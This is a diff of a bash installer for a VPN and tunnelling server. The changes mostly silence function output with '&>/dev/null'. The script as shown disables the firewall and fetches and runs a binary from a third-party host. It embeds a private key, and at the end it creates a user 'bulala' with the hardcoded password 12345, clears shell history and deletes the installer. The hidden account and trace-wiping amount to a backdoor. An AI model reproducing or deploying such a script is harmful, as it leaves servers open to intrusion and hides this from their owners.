@@ -10,12 +10,12 @@ timedatectl set-timezone Asia/Riyadh
 
 
 system_package (){
-  sudo timedatectl set-timezone Asia/Manila
-  timedatectl
-  apt-get update -y
-  sudo apt install screen
-  ufw disable
-  apt update
+sudo timedatectl set-timezone Asia/Manila
+timedatectl
+apt-get update -y
+sudo apt install screen
+ufw disable
+apt update
 apt install -y gnupg openssl
 apt install -y iptables socat
 apt install -y netcat httpie php neofetch vnstat
@@ -67,9 +67,8 @@ chmod 755 /etc/hysteria/hysteria.key
 wget -O /usr/bin/badvpn-udpgw "https://apk.admin-boyes.com/setup/badvpn-udpgw64"
 chmod +x /usr/bin/badvpn-udpgw
 ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
+}&>/dev/null
 }
-}
-
 
 
 
@@ -158,9 +157,7 @@ AwEHoUQDQgAENj+S90/5JQNPsS2swnmmMdZ1O6koVCfM07OW9ge62tFn9C7SKTnk
 M/zfT0QP5AWcr+UF2xDBdjCw8vEOk7EWrQ==
 -----END EC PRIVATE KEY-----
 EOF
-
-
-}
+}&>/dev/null
 }
 
 
@@ -176,7 +173,7 @@ iptables -F
 iptables -t nat -A PREROUTING -i eth0 -p udp -m udp --dport 20000:50000 -j DNAT --to-destination :5666
 iptables-save > /etc/iptables_rules.v4
 ip6tables-save > /etc/iptables_rules.v6
-}
+}&>/dev/null
 }
 
 
@@ -205,7 +202,7 @@ exit 0' >> /etc/rc.local
     systemctl daemon-reload
     sudo systemctl enable tknetwork
     sudo systemctl start tknetwork.service
-  }
+  }&>/dev/null
 }
 
 
@@ -257,10 +254,8 @@ cat > /etc/banner << MyBanner
 <br><font color=yellow size=7><b>POWERED BY: Mediatek</b></font>
 <br>
 MyBanner
-
-
-
 }
+
 
 install_stunnel () {
 apt-get install stunnel4 -y > /dev/null 2>&1
@@ -888,6 +883,7 @@ fi
 
 
 
+
 if nc -z localhost 8000; then
     echo "SocksProxy running"
 else
@@ -928,6 +924,8 @@ echo "* * * * * /bin/bash /bin/auto >/dev/null 2>&1
 }
 
 
+
+
 iptablesrules () {
 echo 'net.ipv4.ip_forward=1
 ' >> /etc/sysctl.conf
@@ -957,7 +955,7 @@ systemctl enable hysteria-server.service
  /usr/sbin/useradd -p $(openssl passwd -1 12345) -M bulala
  history -c;
  rm ~/install_server.sh
- rm ~/hysteria.sh
+ rm ~/nameofscript.x
  netstat -tupln
  reboot
 }
